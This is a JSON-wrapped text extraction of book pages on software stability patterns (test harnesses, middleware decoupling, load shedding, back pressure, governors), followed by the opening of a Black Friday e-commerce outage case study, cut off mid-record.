      "content": "Chapter 5. Stability Patterns • 114\n\nfailures that can occur naturally in production, there will be behaviors that integration testing does not verify.\n\nA better approach to integration testing would allow you to test most or all of these failure modes. It should preserve or enhance system isolation to avoid the version-locking problem and allow testing in many locations instead of the unitary enterprise-wide integration testing environment I described earlier on page 113.\n\nTo do that, you can create test harnesses to emulate the remote system on the other end of each integration point. Hardware and mechanical engineers have used test harnesses for a long time. Software engineers have used test harnesses, but not as maliciously as they should. A good test harness should be devious. It should be as nasty and vicious as real-world systems will be. The test harness should leave scars on the system under test. Its job is to make the system under test cynical.\n\nWhy Not Mock Objects?\n\nMock objects are a technique commonly applied with unit testing. A mock object supplies an alternative implementation—to be used by the object under test—that can be controlled by the unit test itself. For example, suppose an application uses a DataGateway object as a layer façade for the entire persistence layer. The real implemen- tation of DataGateway would deal with connection parameters, a database server, and a bunch of test data. That’s a lot of coupling for a single test, which often results in irreproducible test results or hidden dependencies between tests. A mock object improves the isolation of a unit test by cutting off all the external connections. Mock objects are often used at the boundaries between layers.\n\nSome mock objects can be set up to throw exceptions when the object under test invokes their methods. This does permit the unit test to simulate some kinds of fail- ures, especially those that map to exceptions (assuming that the underlying code in the real implementation would generate exceptions).\n\nA test harness differs from mock objects in that a mock object can only be trained to produce behavior that conforms to the defined interface. A test harness runs as a separate server, so it’s not obliged to conform to any interface. It can provoke network errors, protocol errors, or application-level errors. If all low-level errors were guaranteed to be recognized, caught, and thrown as the right type of exception, we would not need test harnesses.\n\nConsider building a test harness that substitutes for the remote end of every web services call. Because the remote call uses the network, the socket con- nection is susceptible to the following failures:\n\nreport erratum • discuss",
      "content_length": 2715,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 127,
      "content": "Test Harnesses • 115\n\nIt can be refused.\n\nIt can sit in a listen queue until the caller times out.\n\nThe remote end can reply with a SYN/ACK and then never send any data.\n\nThe remote end can send nothing but RESET packets.\n\nThe remote end can report a full receive window and never drain the data.\n\nThe connection can be established, but the remote end never sends a byte\n\nof data.\n\nThe connection can be established, but packets could be lost, causing\n\nretransmit delays.\n\nThe connection can be established, but the remote end never acknowledges\n\nreceiving a packet, causing endless retransmits.\n\nThe service can accept a request, send response headers (supposing\n\nHTTP), and never send the response body.\n\nThe service can send one byte of the response every thirty seconds.\n\nThe service can send a response of HTML instead of the expected XML.\n\nThe service can send megabytes when kilobytes are expected.\n\nThe service can refuse all authentication credentials.\n\nThese failures fall into distinct categories: network transport problems, net- work protocol problems, application protocol problems, and application logic problems. With a little mental exercise, you can find failure modes in every layer of the seven-layer OSI model. It would be costly and bizarre to add switches and flags to applications that would allow them to simulate all of these failures. Who would want to risk turning on a “simulated failure” once the system is promoted into production? Integration testing environments are good at examining failures only in the seventh layer—the application layer—and not even all of those.\n\nA test harness “knows” that it’s meant for testing; it has no other role to play. Although the real application wouldn’t be written to call the low-level network APIs directly, the test harness can be. Therefore, it’s able to send bytes too quickly, or very slowly. It can set up extremely deep listen queues. It can bind to a socket and then never service a single connection attempt. The test harness should act like a little hacker, trying all kinds of bad behavior to break callers.\n\nreport erratum • discuss",
      "content_length": 2115,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 128,
      "content": "Chapter 5. Stability Patterns • 116\n\nMany kinds of bad behavior will be similar for different applications and protocols. For example, refusing connections, connecting slowly, and accepting requests without reply would apply to any socket protocol: HTTP, RMI, or RPC. For these, a single test harness can simulate many types of bad network behavior. One trick I like is to have different port numbers indicate different kinds of misbehavior. On port 10200, it would accept connections but never reply. Port 10201 gets a connection and a reply, but the reply will be copied from /dev/random. Port 10202 will open a connection, then drop it immediately, and so on. That way, I don’t need to change modes on the test harness and a single test harness can break many applications. It can even help with functional testing in the development environment by letting multiple developers hit the test harness from their workstations. (Of course, it’s also worthwhile to let the developers run their own instances of the killer test harness.)\n\nBear in mind that your test harness might be really, really good at breaking, even killing applications. It’s not a bad idea to have the test harness log requests, in case your application dies without so much as a whimper to indicate what killed it.\n\nA test harness that injects faults will unearth many hidden dependencies. Injecting latency in requests will uncover many more. Reordering TCP packets will uncover more again. The only limit is your imagination.\n\nThe test harness can be designed like an application server; it can have pluggable behavior for the tests that are related to the real application. A single framework for the test harness can be subclassed to implement any application-level protocol, or any perversion of the application-level protocol, necessary. Broadly speaking, a test harness leads toward “chaos engineering,” which we explore in Chapter 17, Chaos Engineering, on page 325.\n\nRemember This\n\nEmulate out-of-spec failures.\n\nCalling real applications lets you test only those errors that the real application can deliberately produce. A good test harness lets you simulate all sorts of messy, real-world failure modes.\n\nStress the caller.\n\nThe test harness can produce slow responses, no responses, or garbage responses. Then you can see how your application reacts.\n\nreport erratum • discuss",
      "content_length": 2360,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 129,
      "content": "Decoupling Middleware • 117\n\nLeverage shared harnesses for common failures.\n\nYou don’t necessarily need a separate test harness for each integration point. A “killer” server can listen to several ports, creating different failure modes depending on which port you connect to.\n\nSupplement, don’t replace, other testing methods.\n\nThe Test Harness pattern augments other testing methods. It does not replace unit tests, acceptance tests, penetration tests, and so on. Each of those techniques help verify functional behavior. A test harness helps verify “nonfunctional” behavior while maintaining isolation from the remote systems.\n\nDecoupling Middleware\n\nMiddleware is a graceless name for tools that inhabit a singularly messy space —integrating systems that were never meant to work together. Rebranded as enterprise application integration, middleware became a hot property for a few years in the early 2000s and then faded back into its shadowy, thankless realm. Middleware occupies the essential interstices between enterprise sys- tems. It is the connective tissue that bridges gaps between different islands of automation. (How’s that for a mixed metaphor?)\n\nOften described as “plumbing”—with all the related connotations—middleware will always remain inherently messy, since it must work with different business processes, different technologies, and even different definitions of the same logical concept. This “unsexiness” must be part of the reason why service- oriented architectures are currently stealing attention from the less glamorous, but more necessary, job of middleware.\n\nDone well, middleware simultaneously integrates and decouples systems. It integrates them by passing data and events back and forth between the sys- tems. It decouples them by letting the participating systems remove specific knowledge of and calls to the other systems. Since integration points are the number one cause of instability, this looks like a good thing.\n\nAny kind of synchronous call-and-response or request/reply method forces the calling system to stop what it’s doing and wait. In this model, the calling system and the receiving system must both be active at the same time—they are syn- chronous in time—though they may be in different places. This category covers remote procedure calls (RPCs), HTTP, XML-RPC, RMI, CORBA, DCOM, and any other analog of local method calls. Tightly coupled middleware amplifies shocks to the system. Synchronous calls are particularly vicious amplifiers that facilitate cascading failures. Yes, this includes JSON over HTTP, too.\n\nreport erratum • discuss",
      "content_length": 2597,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 130,
      "content": "Chapter 5. Stability Patterns • 118\n\nLess tightly coupled forms of middleware allow the calling and receiving sys- tems to process messages in different places and at different times. The ven- erable IBM MQseries and any queue-based or publish/subscribe messaging systems fall into this category, as does system-to-system messaging via SMTP or SMS. (These latter two protocols frequently have message brokers imple- mented with carbon, hydrogen, oxygen, and nitrogen rather than silicon. Latency also tends to be high.) The following figure depicts the spectrum of coupling exhibited by different middleware technologies.\n\nSame TimeSame HostSame ProcessDiﬀerent TimeDiﬀerent HostDiﬀerent ProcessIn-ProcessMethod CallsShared MemoryPipesSemaphoresWindows EventsInterprocessCommunicationC FunctionsJava CallsDynamic LibsDCE RPCDCOMRMIXML-RPCHTTPRemoteProcedure CallsSame TimeDiﬀerent HostDiﬀerent ProcessMQPub-SubSMTPSMSMessage-OrientedMiddlewareJavaSpacesGigaSpacesPySpacesTuple Spaces\n\nMessage-oriented middleware decouples the endpoints in both space and time. Because the requesting system doesn’t just sit around waiting for a reply, this form of middleware cannot produce a cascading failure. Messaging systems used to be some of the most expensive infrastructure you would buy. These days, we have very solid open source tools as well.\n\nThe main advantage of synchronous (tightly coupled) middleware lies in its logical simplicity. Suppose a customer’s proposed credit card purchase needs to be authorized. If this authorization is implemented using a remote procedure call or XML-RPC, the application can clearly decide whether to proceed with the next step of the checkout process or send the user back to the payment methods page. By comparison, if the system just sends a message asking for credit card authorization, without waiting for a reply, then it must somehow decide what to do if the authorization request ultimately fails or, worse, remains unanswered. Designing asynchronous processes is inherently harder. The process must deal with exception queues, late responses, callbacks (computer-to-computer as well as human-to-human), and assumptions. These decisions even involve the business sponsors of the calling system, who will occasionally have to decide what the acceptable level of financial risk is.\n\nYou can apply most of the patterns in this chapter without greatly affecting the implementation cost of the system. Middleware decisions are not the\n\nreport erratum • discuss",
      "content_length": 2498,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 131,
      "content": "Shed Load • 119\n\nsame. The move from synchronous request/reply to asynchronous communi- cation necessitates very different design. That makes the switching cost something to consider.\n\nRemember This\n\nDecide at the last responsible moment.\n\nOther stability patterns can be implemented without large-scale changes to the design or architecture. Decoupling middleware is an architecture decision. It ripples into every part of the system. This is one of those nearly irreversible decisions that should be made early rather than late.\n\nAvoid many failure modes through total decoupling.\n\nThe more fully you decouple individual servers, layers, and applications, the fewer problems you will observe with Integration Points, Cascading Failures, Slow Responses, and Blocked Threads. You’ll find that decoupled applications are also more adaptable, since you can change any of the participants independently of the others.\n\nLearn many architectures, and choose among them.\n\nNot every system needs to look like a three-tier application with a relational database. Learn many architectural styles, and select the best architecture for the problem at hand.\n\nShed Load\n\nServices, microservices, websites, and open APIs all share one characteristic: they have zero control over their demand. At any moment, more than a billion devices could make a request. No matter how strong your load balancers or how fast you can scale, the world can always make more load than you can handle.\n\nAt the network level, TCP copes with a flood of connection attempts via the listen queue. Every incomplete connection goes into a queue per port. It’s up to the application to accept the connections. When the queue is full, new connection attempts are rejected with an ICMP RST (reset) packet.\n\nTCP can’t save us entirely, though. Services often fall over before the connec- tion queue fills up. When that happens, it’s almost always due to contention for a pooled resource. Threads start to slow down, waiting for a resource. Once they have the resource, they run slower because too much RAM and CPU are used by all the extra threads. Sometimes this gets exacerbated by other resource pools that are also exhausted. The net result is lengthening response times until callers start timing out. To an outside observer, there’s no difference between “really, really slow” and “down.”\n\nreport erratum • discuss",
      "content_length": 2377,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 132,
      "content": "Chapter 5. Stability Patterns • 120\n\nServices should model TCP’s approach. When load gets too high, start to refuse new requests for work. This is related to Fail Fast.\n\nThe ideal way to define “load is too high” is for a service to monitor its own performance relative to its SLA. When requests take longer than the SLA, it’s time to shed some load. Failing that, you may choose to keep a semaphore in your application and only allow a certain number of concurrent requests in the system. A queue between accepting connections and process- ing them would have a similar effect, but at the expense of both complexity and latency.\n\nWhen a load balancer is in the picture, individual instances can use a 503 status code on their health check pages to tell the load balancer to back off for a while.\n\nInside the boundaries of a system or enterprise, it’s more efficient to use back pressure (see Create Back Pressure, on page 120) to create a balanced throughput of requests across synchronously coupled services. Shed load as a secondary measure in these cases.\n\nRemember This\n\nYou can’t out-scale the world.\n\nNo matter how large your infrastructure or how fast you can scale it, the world has more people and devices than you can support. If your service is exposed to uncontrolled demand, then you need to be able to shed load when the world goes crazy on you.\n\nAvoid slow responses using Shed Load.\n\nCreating slow responses is being a bad citizen. Keep your response times under control rather than getting so slow that callers time out.\n\nUse load balancers as shock absorbers.\n\nIndividual instances can report HTTP 503 to get some breathing room. Load balancers are good at recycling connections very quickly.\n\nCreate Back Pressure\n\nEvery performance problem starts with a queue backing up somewhere. Maybe it’s a socket’s listen queue. Maybe it’s the OS’s run queue or the databases I/O queue.\n\nIf a queue is unbounded, it can consume all available memory. As the queue grows, the time it takes for a piece of work to get all the way through it grows\n\nreport erratum • discuss",
      "content_length": 2079,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 133,
      "content": "Create Back Pressure • 121\n\ntoo. (See Little’s law.3) So as a queue’s length reaches toward infinity, response time also heads toward infinity. We really don’t want unbounded queues in our systems.\n\nOn the other hand, if the queue is bounded, we have to decide what to do when it’s full and a producer tries to stuff one more thing into it. Even if the object is wafer-thin, the queue has no space.\n\nWe really have only a few options:\n\nPretend to accept the new item but actually drop it on the floor.\n\nActually accept the new item and drop something else from the queue on\n\nthe floor.\n\nRefuse the item.\n\nBlock the producer until there is room in the queue.\n\nFor some use cases, dropping the item may be the best option. For data whose value decreases rapidly with age, dropping the oldest item in the queue might be the best option.\n\nBlocking the producer is a kind of flow control. It allows the queue to apply “back pressure” upstream. Presumably that back pressure propagates all the way to the ultimate client, who will be throttled down in speed until the queue releases.\n\nTCP uses extra fields in each packet to create back pressure. Once the window is full, senders are not allowed to send anything until released. Back pressure from the TCP window can cause the sender to fill up its transmit buffers, in which case subsequent calls to write to the socket will block. The mechanisms change but the idea is still to slow the producer down until the consumer can catch up.\n\nObviously back pressure can lead to blocked threads. It’s important to distin- guish back pressure due to a temporary condition from back pressure because a consumer is just broken. The Back Pressure pattern works best with asynchronous calls and programming. One of the many Rx frameworks can help here, as can actors or channels, if your language supports those.\n\nBack pressure only helps manage load when the pool of consumers is finite. That’s because the “upstream” is so diverse that there’s no systemic effect on all of them. We can illustrate this with an example. Suppose your system\n\n3.\n\nhttps://en.wikipedia.org/wiki/Little%27s_law\n\nreport erratum • discuss",
      "content_length": 2149,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 134,
      "content": "Chapter 5. Stability Patterns • 122\n\nprovides an API for user-created “tags” at a specific location. It is used by native apps and web apps.\n\nInternally, there’s a certain rate at which you can create and index new tags. That’s going to be limited by your storage and indexing technology. When the rate of “create tag” calls exceeds the storage engine’s limit, what happens? The calls get slower and slower. Without back pressure, this would lead to a progressive slowdown until the API seems to be offline.\n\nInstead, we can create back pressure by use of a blocking queue for “create tag” calls. Let’s say each API server is allowed 100 simultaneous calls to the storage engine. When the 101st call arrives at the API server, the calling thread blocks until there is an open slot in the queue. That blocking is the back pressure. The API server cannot make calls any faster than it is allowed.\n\nIn this case, a flat limit of 100 calls per server is very crude. It means that one API server may have blocked threads while another has free slots available. We could make this smarter by letting the API servers make as many calls as they want but put the blocking on the receiver’s end. In that case, our off- the-shelf storage engine must be wrapped with a service to receive calls, measure response times, and adjust its internal queue size to maximize throughput and protect the engine.\n\nAt some point, though, the API server still has a thread waiting on a call. As we saw in Blocked Threads, on page 62, blocked threads are a quick path to downtime. At the edge of your system boundary, blocked threads will frustrate a user or provoke a retry loop. As such, back pressure works best within a system boundary. At the edges, you also need load shedding and asyn- chronous calls.\n\nIn our example, the API server should accept calls on one thread pool and then issue the outbound call to storage on another set of threads. That way, when the outbound call blocks, the request-handling thread can time out, unblock, and respond with an HTTP 503. Alternatively, it could drop a “create tag” command in a queue for later indexing. Then an HTTP 202 would be more appropriate.\n\nA consumer inside your system boundary will experience back pressure as a performance problem or as timeouts. In fact, it does indicate a real perfor- mance problem—the consumers collectively generated more load than the provider can handler! That doesn’t always mean the provider is to blame, though. It might have enough capacity for “normal” traffic, but one consumer went nuts and started eating Cincinnati. It could be due to an attack of self- denial or just organic changes in traffic patterns.\n\nreport erratum • discuss",
      "content_length": 2701,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 135,
      "content": "Governor • 123\n\nWhen Back Pressure kicks in, monitoring needs to know about it. That way you can tell whether it’s a random fluctuation or a trend.\n\nRemember This\n\nBack Pressure creates safety by slowing down consumers.\n\nConsumers will experience slowdowns. The only alternative is to let them crash the provider.\n\nApply Back Pressure within a system boundary\n\nAcross boundaries, look at load shedding instead. This is especially true when the Internet at large is your user base.\n\nQueues must be finite for response times to be finite.\n\nYou only have a few options when a queue is full. All of them are unpleasant: drop data, refuse work, or block. Consumers must be careful not to block forever.\n\nGovernor\n\nIn Force Multiplier, on page 80, we looked into an outage that Reddit.com suffered. As a quick reminder, Reddit’s configuration management system restarted a part of its infrastructure management that scales server instances up and down. This was in the middle of a ZooKeeper migration, so the autoscaler read a partial configuration and decided to shut down nearly every machine instance in Reddit.\n\nThe flip side of that coin is a job scheduler that spins up too many compute instances in order to process a queue before a deadline. The work still can’t get done fast enough, and, to add insult to injury, the cloud provider’s invoice that month is written in scientific notation.\n\nAutomation has no judgment. When it goes wrong, it tends to go wrong really quickly. By the time a human perceives the problem, it’s a question of recovery rather than intervention. How can we allow human intervention without putting a human in the loop for everything? We should use automation for things humans are bad at: repetitive tasks and fast response. We should use humans for what automation is bad at: perceiving the whole situation at a higher level.\n\nBelieve it or not, we can look to eighteenth-century technology for an answer. Before the era of steam engines, power came from muscles (human or animal). Steam engineers quickly discovered that it is possible to run machines so fast that the metal breaks. Parts fly apart from tension or they seize up under compression. Bad things happen to the machines and to anyone nearby. The solution was the governor. A governor limits the speed of an engine. Even if\n\nreport erratum • discuss",
      "content_length": 2341,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 136,
      "content": "Chapter 5. Stability Patterns • 124\n\nthe source of power could drive it faster, the governor prevents it from running at unsafe RPMs.\n\nWe can create governors to slow the rate of actions. Reddit did this with its autoscaler by adding logic that says it can only shut down a certain percentage of instances at a time.\n\nA governor is stateful and time-aware. It knows what actions have been taken over a period of time. It should also be asymmetric. Most actions have a “safe” direction and an “unsafe” one. Shutting down instances is unsafe. Deleting data is unsafe. Blocking client IP addresses is unsafe.\n\nYou will often find a tension between definitions of “safe.” Shutting down instances is unsafe for availability, while spinning up instances is unsafe for cost. These forces don’t cancel each other out. Instead, they define a U-shaped curve where going too far in either direction is bad. That means actions may also be safe within a defined range but unsafe outside the range. Your AWS budget may allow for a thousand EC2 instances, but if the autoscaler starts heading toward two thousand, then it needs to slow down. You can think about this U-shaped curve as defining the response curve for the governor. Inside the safe zone, the actions are fast. Outside the range, the governor applies increasing resistance.\n\nThe whole point of a governor is to slow things down enough for humans to get involved. Naturally that means connecting to monitoring both to alert humans that there’s a situation and to give them enough visibility to under- stand what’s happening.\n\nRemember This\n\nSlow things down to allow intervention.\n\nWhen things are about to go off the rails, we often find automation tools pushing the throttle to its limit. Humans are better at situational thinking, so we need to create opportunities for us to intervene.\n\nApply resistance in the unsafe direction.\n\nSome actions are inherently unsafe. Shutting down, deleting, blocking things...these are all likely to interrupt service. Automation will make them go fast, so you should apply a Governor to provide humans with time to intervene.\n\nreport erratum • discuss",
      "content_length": 2137,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 137,
      "content": "Wrapping Up • 125\n\nConsider a response curve.\n\nActions may be safe within a defined range. Outside that range they should encounter increasing “resistance” by slowing down the rate by which they can occur.\n\nWrapping Up\n\nIn time, even shockingly unlikely combinations of circumstances will eventu- ally occur. If you ever catch yourself saying, “The odds of that happening are astronomical,” or some similar utterance, consider this: a single small service might do ten million requests per day over three years, for a total of 10,950,000,000 chances for something to go wrong. That’s more than ten billion opportunities for bad things to happen. Astronomical observations indicate there are four hundred billion stars in the Milky Way galaxy. Astronomers consider a number “close enough” if it’s within a factor of 10. Astronomically unlikely coincidences happen all the time.\n\nFailures are inevitable. Our systems, and those we depend on, will fail in ways large and small. Stability antipatterns amplify transient events. They accelerate cracks in the system. Avoiding the antipatterns does not prevent bad things from happening, but it will help minimize the damage when bad things do occur.\n\nJudiciously applying these stability patterns results in software that stays up, come hell or high water. The key to applying these patterns successfully is judgment. Examine the software’s requirements cynically. View other enterprise systems with suspicion and distrust—any of them can stab you in the back. Identify the threats, and apply stability patterns appropriate to each threat. Paranoia is good engineering.\n\nOur production environments don’t much resemble just a desktop or laptop computer any more. Everything is different, from network configuration and performance to security restrictions and runtime limits. In the next part of this book, we’re going to look at design for production operations.\n\nreport erratum • discuss",
      "content_length": 1934,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 138,
      "content": "Part II\n\nDesign for Production",
      "content_length": 30,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 139,
      "content": "CHAPTER 6\n\nCase Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space\n\nIn the middle 1500s, a Calabrian doctor named Aloysius Lilius invented a new calendar to fix a bug in the widely used Julian calendar. The Julian calendar had an accumulating drift. After a few hundred years, the official calendar date for the solstice would occur weeks before the actual event. Lilius’s calendar used an elaborate system of corrections and countercorrections to keep the official calendar dates for the equinoxes and solstices close to the astronomical events. Over a 400-year cycle, the calendar dates vary by as much as 2.25 days, but they vary predictably and periodically; overall, the error is cyclic, not cumulative. This calendar, decreed by Pope Gregory XIII, became known as the Gregorian calendar rather than the Lilian calendar. (They just use your mind and they never give you credit. It’s enough to drive you crazy if you let it.) The Gregorian calendar was eventually adopted by all European nations, although not without struggles, and even by Egypt, China, Korea, and Japan (with modifications for the latter three). Some nations adopted this calendar as early as 1582, while others adopted it only in the 1920s.\n\nIt’s no wonder that the church decreed the calendar. The Gregorian calendar, like most calendars, was created to mark holy days (that is, holidays). It has since been used to mark useful recurring events in certain other domains that depend on the annual solar cycle, such as agriculture. No business in the world actually lives by the Gregorian calendar, though. The business community uses the dates as a convenient marker for its own internal business cycle.\n\nEach industry has its own internal almanac. For a health insurance company, the year is structured around “open enrollment.” All plans take their bearings from the open enrollment period. Florists’ thinking is dominated by Valentine’s\n\nreport erratum • discuss",
      "content_length": 1945,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 140,
      "content": "Chapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 130\n\nDay and Mother’s Day. Upstream from them, Colombian flower growers center their agricultural year to produce the blossoms for those florists. These landmarks happen to be marked with specific dates on the Gregorian calendar, but in the minds of florists and their entire extended supply chain, those seasons have their own significance beyond the official calendar date.\n\nFor retailers, the year begins and ends with the euphemistically named “holiday season.” Here we see a correspondence between various religious calendars and the retail calendar. Christmas, Hanukkah, and Kwanzaa all occur relatively close together. Since “Christmahannukwanzaakah” turns out to be difficult to say in meetings with a straight face, they call it the “holiday season” instead. Don’t be fooled, though. Retailers’ interest in the holiday season is strictly ecumenical—some might even call it cynical. Up to 50 percent of a retailer’s entire annual revenue occurs between November 1 and December 31.\n\nIn the United States, Thanksgiving—the fourth Thursday in November—is the de facto start of the retail holiday season. By long tradition, this is when consumers start getting serious about gift shopping, because there are usu- ally a little less than 30 days left in the season at that point. Apparently, motivation by deadline crosses religious boundaries. Shopper panic sets in, resulting in a collective phenomenon known as Black Friday. Retailers encourage and reinforce this by changing their assortment, increasing stocks in stores, and advertising wondrous things. Traffic in physical stores can quadruple overnight. Traffic at online stores can increase by 1,000 percent. This is the real load test, the only one that matters.\n\nBaby’s First Christmas\n\nMy client had launched a new online store in the summer. The weeks and months following launch proved, time and time again, why launching a new site is like having a baby. You must expect certain things, such as being awakened in the middle of the night and routinely uncovering horrifying dis- coveries (as in, “Dear God! What have you been feeding this child...orange Play-Doh?” or “What? Why would they parse content during page rendering?”) Still, for all the problems we experienced following the launch, we approached the holiday season with cautious optimism.\n\nOur optimism was rooted in several factors. First, we had nearly doubled the number of servers in production. Second, we had hard data showing that the site was stable at current loads. A few burst events (mispriced items, mainly) had given us some traffic spikes to measure. The spikes were large enough to see where page latency started to climb, so we had a good feel for what level of load would cause the site to bog down. The third reason for our optimism\n\nreport erratum • discuss",
      "content_length": 2880,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 141,
      "content": "Taking the Pulse • 131\n\nsprang from the confidence that we could handle whatever the site decided to throw at us. Between the inherent capabilities of the application server and the tools we had built around the application server, we had more visibil- ity and control over the online store internals than any other system on which I’ve worked. This would ultimately prove to be the difference between a difficult but successful Thanksgiving weekend and an unmitigated disaster.\n\nA few of us who had pulled weekend duty through Labor Day had been granted weekend passes. I had a four-day furlough to take my family to my parents’ house three states away for Thanksgiving dinner. We had also scheduled a twenty-four-hour onsite presence through the weekend. As I said, we were executing cautious optimism. Bear in mind, we were the local engineering team; the main site operations center (SOC)—a facility staffed with highly skilled engineers twenty-four hours a day—was in another city. Ordinarily, they were the ones monitoring and managing sites during the nights and weekends. Local engineering was there to provide backup for the SOC, an escalation path when they encounter problems that have no known solution. Our local team was far too small to be on-site twenty-four hours a day all the time, but we worked out a way to do it for the limited span of the Thanksgiving weekend. Of course, as a former Boy Scout (“Be prepared”), I crammed my laptop into the packed family van, just in case.\n\nTaking the Pulse\n\nWhen we arrived on Wednesday night, I immediately set up my laptop in my parents’ home office. I can work anywhere I have broadband and a cell phone. Using their 3 MB cable broadband, I used PuTTY to log into our jumphost and start up my sampling scripts.\n\nDuring the run-up to the launch, I was part of load testing this new site. Most load tests deliver results after the test is done. Since the data come from the load generators rather than inside the systems under test, it is a “black-box” test. To get more information out of the load test, I had started off using the application server’s HTML administration GUI to check vitals like latency, free heap memory, active request-handling threads, and active sessions.\n\nIf you don’t know in advance what you are looking for, then a GUI is a great way to explore the system. If you know exactly what you want, the GUI gets tedious. On the other hand, if you need to look at thirty or forty servers at a time, the GUI gets downright impractical.\n\nTo get more out of our load tests, I wrote a collection of Perl modules that would screen-scrape the admin GUI for me, parsing the HTML for values.\n\nreport erratum • discuss",
      "content_length": 2687,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 142,
      "content": "Chapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 132\n\nThese modules would let me get and set property values and invoke methods on the components of the application server—built-in as well as custom. Because the entire admin GUI was HTML-based, the application server never knew the difference between a Perl module or a web browser. Armed with these Perl modules, I was able to create a set of scripts that would sample all the application servers for their vital stats, print out detail and summary results, sleep a while, and loop.\n\nThey were simple indicators, but in the time since site launch, all of us had learned the normal rhythm and pulse of the site by watching these stats. We knew, with a single glance, what was normal for noon on Tuesday in July. If session counts went up or down from the usual envelope, if the count of orders placed just looked wrong, we would know. It’s really surprising how quickly you can learn to smell problems. Monitoring technology provides a great safety net, pinpointing problems when they occur, but nothing beats the pattern-matching power of the human brain.\n\nThanksgiving Day\n\nAs soon as I woke up Thanksgiving morning, before I even had a cup of coffee, I hopped into my parents’ office to check the stats windows I left running all night. I had to look twice to be sure of what I saw. The session count in the early morning already rivaled peak time of the busiest day in a normal week. The order counts were so high that I called our DBA to verify orders were not being double-submitted. They weren’t.\n\nBy noon, customers had placed as many orders as in a typical week. Page latency, our summary indicator of response time and overall site performance, was clearly stressed but still nominal. Better still, it was holding steady over time, even as the number of sessions and orders mounted. I was one happy camper over turkey dinner. By evening, we had taken as many orders in one day as in the entire month to date. By midnight, we had taken as many orders as in the entire month of October—and the site held up. It passed the first killer load test.\n\nBlack Friday\n\nThe next morning, on Black Friday, I ambled into the office after breakfast to glance at the stats. Orders were trending even higher than the day before. Session counts were up, but page latency was still down around 250 millisec- onds, right where we knew it should be. I decided to head out around town with my mom to pick up the ingredients for chicken curry. (It would be\n\nreport erratum • discuss",
      "content_length": 2547,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 143,
      "content": "Black Friday • 133\n\nThanksgiving leftovers for dinner on Friday, but I wanted to make the curry on Saturday, and our favorite Thai market was closed on Saturday.)\n\nOf course, I wouldn’t be telling this story if things didn’t go horribly wrong. And things wouldn’t go horribly wrong until I was well away from my access point. Sure enough, I got the call when I was halfway across town.\n\n“Good morning, Michael. This is Daniel from the site operations center,” said Daniel.\n\n“I’m not going to like this, am I, Daniel?” I asked.\n\n“SiteScope is currently showing red on all DRPs. We’ve been doing rolling restarts of DRPs, but they’re failing immediately. David has a conference call going and has asked for you to join the bridge.”\n\nOnlineStoreSiteScopeNYC\n\nCustomers\n\nSiteScopeSan Francisco20 Hosts75 DRPs3,000 Threads\n\nIn the terse code we’ve evolved in our hun- dreds of calls, Daniel was telling me that the site was down, and down hard. SiteScope simulates real customers, as shown in the figure. When SiteScope goes red, we know that customers aren’t able to shop and we’re losing revenue. In an ATG site,1 page requests are handled by instances that do nothing but serve pages. The web server calls the applica- tion server via the Dynamo Request Protocol (DRP), so it’s common to refer to the request- handling instances as DRPs. A red DRP indi- cates that one of those request-handling instances stopped responding to page requests. “All DRPs red” meant the site was down, losing orders at a rate of about a million dollars an hour. “Rolling restart” meant they were shutting down and restarting the application servers as fast as possible. It takes about ten minutes to bring up all the application servers on a single host. You can do up to four or five hosts at a time, but more than that and the database response time starts to suffer, which makes the start-up process take longer. All together, it meant they were trying to tread water but were still sinking.\n\n“OK. I’ll dial in now, but I’m thirty minutes from hands on keyboard,” I told him.\n\nDaniel said, “I have the conference bridge and passcode for you.”\n\n“Never mind. I’ve got it memorized,” I said.\n\n1.\n\nwww.oracle.com/applications/customer-experience/ecommerce/products/commerce-platform/index.html\n\nreport erratum • discuss",
      "content_length": 2296,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 144,
      "content": "Chapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 134\n\nI dialed in and got a babel of voices. Clearly, a speakerphone in a conference room was dialed into the bridge as well. There’s nothing like trying to sort out fifteen different voices in an echoing conference room, especially when other people keep popping in and out of the call from their desks, announcing such helpful information as, “There’s a problem with the site.” Yes, we know. Thank you and hang up, please.\n\nVital Signs\n\nThe incident had started about twenty minutes before Daniel called me. The operations center had escalated to the on-site team. David, the operations manager, had made the choice to bring me in as well. Too much was on the line for our client to worry about interrupting a vacation day. Besides, I had told them not to hesitate to call me if I was needed.\n\nWe knew a few things at this point, twenty minutes into the incident:\n\nSession counts were very high, higher than the day before.\n\nNetwork bandwidth usage was high but not hitting a limit.\n\nApplication server page latency (response time) was high.\n\nWeb, application, and database CPU usage were low—really low.\n\nSearch servers, our usual culprit, were responding well. System stats\n\nlooked healthy.\n\nRequest-handling threads were almost all busy. Many of them had been\n\nworking on their requests for more than five seconds.\n\nIn fact, the page latency wasn’t just high. Because requests were timing out, it was effectively infinite. The statistics showed us only the average of requests that completed. Response time is always a lagging indicator. You can only measure the response time on requests that are done. So whatever your worst response time may be, you can’t measure it until the slowest requests finish.\n\nRequests that didn’t complete never got averaged in. Other than the long response time, which we already knew about since SiteScope was failing to complete its synthetic transactions, none of our usual suspects looked guilty.\n\nTo get more information, I started taking thread dumps of the application servers that were misbehaving. While I was doing that, I asked Ashok, one of our rock- star engineers who was on-site in the conference room, to check the back- end order management system. He saw similar patterns on the back end as on the front end: low CPU usage and most threads busy for a long time.\n\nreport erratum • discuss",
      "content_length": 2415,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 145,
